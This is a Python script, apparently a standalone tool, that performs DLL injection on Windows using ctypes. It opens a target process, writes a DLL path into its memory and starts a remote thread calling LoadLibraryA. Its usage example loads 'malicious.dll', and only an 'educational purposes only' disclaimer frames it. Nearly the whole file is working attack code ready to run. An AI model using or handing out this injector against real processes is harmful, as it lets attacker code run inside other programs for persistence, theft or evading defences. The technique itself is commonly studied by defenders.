'''
Author: Yousuf Q
Python DLL Injection Script using ctypes:  This script demonstrates how to inject a DLL 
into a target process by leveraging Windows API functions like VirtualAllocEx, WriteProcessMemory, 
and CreateRemoteThread.
ExecutioN: Open a terminal and run the script with the process ID and DLL path as arguments:
python injector.py <process_id> <path_to_dll>
Example:
python injector.py 1234 C:\path\to\malicious.dll
Disclaimer:
This script is for educational purposes only!
'''

import ctypes
import sys
import os

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

# Windows API functions
OpenProcess = ctypes.windll.kernel32.OpenProcess
VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
GetProcAddress = ctypes.windll.kernel32.GetProcAddress
GetModuleHandleA = ctypes.windll.kernel32.GetModuleHandleA
CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
CloseHandle = ctypes.windll.kernel32.CloseHandle

def inject_dll(process_id, dll_path):
    try:
        # Get handle to the target process
        h_process = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if not h_process:
            raise Exception(f"Failed to open process. Error code: {ctypes.GetLastError()}")

        print(f"[+] Opened process {process_id}")

        # Allocate memory in the target process for the DLL path
        dll_path_bytes = dll_path.encode('utf-8')
        dll_path_len = len(dll_path_bytes) + 1
        remote_memory = VirtualAllocEx(h_process, None, dll_path_len, MEM_COMMIT, PAGE_READWRITE)
        if not remote_memory:
            raise Exception(f"Failed to allocate memory in the target process. Error code: {ctypes.GetLastError()}")

        print(f"[+] Allocated memory in target process at: 0x{remote_memory:X}")

        # Write the DLL path into the allocated memory
        written = ctypes.c_size_t(0)
        if not WriteProcessMemory(h_process, remote_memory, dll_path_bytes, dll_path_len, ctypes.byref(written)):
            raise Exception(f"Failed to write memory in the target process. Error code: {ctypes.GetLastError()}")

        print(f"[+] Wrote DLL path to target process memory")

        # Get the address of LoadLibraryA
        h_kernel32 = GetModuleHandleA(b"kernel32.dll")
        load_library_addr = GetProcAddress(h_kernel32, b"LoadLibraryA")
        if not load_library_addr:
            raise Exception(f"Failed to get LoadLibraryA address. Error code: {ctypes.GetLastError()}")

        print(f"[+] Found LoadLibraryA at: 0x{load_library_addr:X}")

        # Create a remote thread in the target process to load the DLL
        thread_handle = CreateRemoteThread(h_process, None, 0, load_library_addr, remote_memory, 0, None)
        if not thread_handle:
            raise Exception(f"Failed to create remote thread. Error code: {ctypes.GetLastError()}")

        print(f"[+] Created remote thread to load DLL")

        # Wait for the thread to finish
        ctypes.windll.kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
        print(f"[+] DLL injection completed successfully")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        if 'h_process' in locals() and h_process:
            CloseHandle(h_process)
        if 'thread_handle' in locals() and thread_handle:
            CloseHandle(thread_handle)

# Main entry point
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python injector.py <process_id> <path_to_dll>")
        sys.exit(1)

    process_id = int(sys.argv[1])
    dll_path = sys.argv[2]

    if not os.path.isfile(dll_path):
        print(f"[-] Error: DLL file not found: {dll_path}")
        sys.exit(1)

    inject_dll(process_id, dll_path)


